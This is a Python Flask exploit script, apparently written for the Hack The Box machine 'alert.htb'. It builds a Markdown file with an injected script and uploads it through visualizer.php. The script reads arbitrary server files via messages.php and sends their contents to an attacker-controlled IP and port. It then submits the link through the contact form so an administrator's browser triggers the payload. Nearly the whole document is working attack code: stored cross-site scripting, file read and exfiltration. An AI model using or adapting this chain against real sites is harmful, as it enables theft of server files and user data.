from flask import Flask, request
import requests
import bs4

app = Flask(__name__)
victim_url = "http://alert.htb"
my_ip = "<REPLACE_ME>"
my_port = 5000
content_dict = {}

@app.route('/', methods=['POST'])
def index():
    args = request.form
    filepath = args.get('filepath')
    if filepath:
        md_payload = (
            '<script>\n'
            f'fetch("http://alert.htb/messages.php?file={filepath}")\n'
            '.then(response => response.text())\n'
            '.then(data => {\n'
            f'fetch("http://{my_ip}:{my_port}/?filepath={filepath}&file_content=" + encodeURIComponent(data));\n'
            '});\n'
            '</script>\n'
            )
        r = requests.post(victim_url + "/visualizer.php", files={'file':('my.md', md_payload)})
        soup = bs4.BeautifulSoup(r.text, features="lxml")
        href = soup.find('a').get('href')
        r2 = requests.post(victim_url + '/contact.php', data = {'email':'a@a.com', 'message':href})
        return filepath
    else:
        return 'error: no filepath'

@app.route('/', methods=['GET'])
def index_get():
    global content_dict
    filepath = request.args.get('filepath')
    filecontent = request.args.get('file_content')
    content_dict[filepath] = filecontent
    return 'ok'

@app.route('/readfile', methods=['GET'])
def readfile():
    filepath = request.args.get('filepath')
    return str(content_dict[filepath])

if __name__ == "__main__":
    app.run(debug=True, host=my_ip, port=my_port)